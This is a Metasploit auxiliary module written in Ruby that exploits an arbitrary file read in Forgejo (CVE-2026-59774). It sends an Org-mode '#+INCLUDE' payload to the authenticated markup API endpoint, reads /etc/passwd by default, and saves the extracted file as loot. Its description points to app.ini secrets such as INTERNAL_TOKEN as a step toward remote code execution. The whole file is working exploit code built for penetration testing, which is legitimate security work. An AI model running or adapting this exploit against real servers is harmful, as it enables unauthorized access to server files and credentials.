##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Forgejo Arbitrary File Read via Org-mode Include',
        'Description' => %q{
          Forgejo versions 7.0 through 15.0.5 and 16.0.0 through 16.0.1 are
          vulnerable to an arbitrary file read via the markup rendering API
          endpoint. The go-org library's default ReadFile callback
          (ioutil.ReadFile) is not overridden, allowing the #+INCLUDE directive
          to read arbitrary files accessible to the service user.

          Valid credentials are required to access the API markup endpoint.
          Extracting sensitive files such as app.ini can expose INTERNAL_TOKEN
          and other secrets, potentially leading to remote code execution.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'xbow-security', # Discovery (Gitea advisory)
          'NightRang3r',   # Independent discovery
        ],
        'References' => [
          ['CVE', '2026-59774'],
          ['GHSA', '6v53-hr58-556r'],
          ['URL', 'https://codeberg.org/forgejo/forgejo/pulls/13682'],
        ],
        'DisclosureDate' => '2026-07-30',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        Opt::RPORT(3000),
        OptString.new('TARGETURI', [true, 'Base path to the Forgejo application', '/']),
        OptString.new('REPO', [false, 'Public repository path (owner/repo). Auto-detected if blank', '']),
        OptString.new('FILEPATH', [true, 'Absolute path of the file to read', '/etc/passwd']),
        OptString.new('USERNAME', [true, 'Username for authentication', '']),
        OptString.new('PASSWORD', [true, 'Password for authentication', '']),
        OptBool.new('STORE_LOOT', [true, 'Store the target file as loot', true]),
      ]
    )
  end

  def check
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'api', 'v1', 'version')
    )

    return Exploit::CheckCode::Unknown('Failed to connect to the target') unless res
    return Exploit::CheckCode::Unknown('Unexpected HTTP response') unless res.code == 200

    version_info = res.get_json_document
    return Exploit::CheckCode::Unknown('Could not parse version response') if version_info.empty?

    version_str = version_info['version'].to_s
    return Exploit::CheckCode::Unknown('No version field in response') if version_str.empty?

    unless version_str.include?('+gitea-')
      return Exploit::CheckCode::Safe('Target does not appear to be Forgejo')
    end

    report_service(host: rhost, port: rport, proto: 'tcp', name: 'http', info: "Forgejo #{version_str}")

    version_check = check_forgejo_version(version_str)
    return version_check unless version_check == Exploit::CheckCode::Appears

    # Verify credentials work before reporting vulnerable
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'api', 'v1', 'user'),
      'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
    )
    unless res&.code == 200
      return Exploit::CheckCode::Detected('Version is vulnerable but credentials are invalid')
    end

    version_check
  end

  def check_forgejo_version(version_str)
    forgejo_version = version_str.split('+').first

    begin
      ver = Rex::Version.new(forgejo_version)
    rescue ArgumentError
      return Exploit::CheckCode::Unknown("Could not parse Forgejo version: #{forgejo_version}")
    end

    if ver < Rex::Version.new('7.0.0')
      return Exploit::CheckCode::Safe("Forgejo #{forgejo_version} predates org-mode rendering support")
    end

    # Patched in v15.0.6 (15.x branch) and v16.0.2 (16.x branch)
    if (ver >= Rex::Version.new('15.0.6') && ver < Rex::Version.new('16.0.0')) ||
       ver >= Rex::Version.new('16.0.2')
      return Exploit::CheckCode::Safe("Forgejo #{forgejo_version} is patched")
    end

    Exploit::CheckCode::Appears("Forgejo #{forgejo_version} is vulnerable (patched in 15.0.6 / 16.0.2)")
  end

  def find_public_repo
    opts = {
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'api', 'v1', 'repos', 'search'),
      'vars_get' => { 'limit' => 1 }
    }
    opts['authorization'] = basic_auth(datastore['USERNAME'], datastore['PASSWORD'])

    res = send_request_cgi(opts)
    return nil unless res&.code == 200

    repos = res.get_json_document
    data = repos.is_a?(Hash) ? repos['data'] : repos
    return nil unless data.is_a?(Array) && !data.empty? && data[0].include?('full_name')

    full_name = data[0]['full_name'].to_s
    return nil unless full_name.match?(%r{\A[\w.-]+/[\w.-]+\z})

    full_name
  end

  def read_file_via_api(repo_path, file_path)
    fail_with(Failure::BadConfig, 'FILEPATH must not contain double-quote characters') if file_path.include?('"')

    payload_text = "#+INCLUDE: \"#{file_path}\" src text"

    opts = {
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'api', 'v1', 'markup'),
      'ctype' => 'application/json',
      'data' => {
        'Mode' => 'file',
        'Text' => payload_text,
        'FilePath' => 'include.org',
        'Context' => repo_path
      }.to_json
    }
    opts['authorization'] = basic_auth(datastore['USERNAME'], datastore['PASSWORD'])

    res = send_request_cgi(opts)
    return nil unless res

    fail_with(Failure::NoAccess, 'Authentication failed') if res.code == 401

    return nil unless res.code == 200

    extract_content(res)
  end

  def extract_content(res)
    doc = res.get_html_document
    return nil unless doc

    # "src text" mode wraps content in <pre><code>...</code></pre>
    code_el = doc.at_css('pre > code')
    return nil unless code_el

    content = code_el.text
    content.blank? ? nil : content
  end

  def run
    repo_path = datastore['REPO']

    if repo_path.blank?
      print_status('No REPO specified, searching for a public repository...')
      repo_path = find_public_repo
      fail_with(Failure::NotFound, 'No public repository found. Set REPO to a known public owner/repo path.') unless repo_path
      print_status("Found public repository: #{repo_path}")
    else
      fail_with(Failure::BadConfig, 'REPO must be in owner/repo format') unless repo_path.match?(%r{\A[\w.-]+/[\w.-]+\z})
    end

    file_path = datastore['FILEPATH']
    print_status("Reading #{file_path} via markup rendering")

    content = read_file_via_api(repo_path, file_path)

    if content.nil? || content.strip.empty?
      print_error('File is empty or could not be read. The file may not exist or may not be accessible to the service user.')
      return
    end

    print_good("Successfully read #{file_path} (#{content.bytesize} bytes)")
    print_line(content)

    report_vuln(
      host: rhost,
      port: rport,
      name: name,
      refs: references,
      info: "Arbitrary file read confirmed: #{file_path}"
    )

    if datastore['STORE_LOOT']
      loot_path = store_loot(
        'forgejo.file',
        'text/plain',
        rhost,
        content,
        file_path,
        'File read via CVE-2026-59774'
      )
      print_good("File saved to: #{loot_path}")
    end
  end
end
